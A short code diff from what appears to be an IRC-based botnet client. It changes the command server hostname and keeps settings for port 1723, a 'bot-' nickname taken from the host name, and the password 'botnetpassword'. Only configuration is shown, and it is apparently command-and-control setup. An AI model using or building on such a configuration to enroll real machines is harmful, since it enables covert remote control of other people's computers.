@@ -4,7 +4,7 @@ import encrypt
 import irc
 import router
 
-settings_server = "jpdias.noip.me"
+settings_server = "pi.jpdias.me"
 settings_port = 1723
 settings_botnick = "bot-" + socket.gethostname()
 settings_botpass = "botnetpassword"
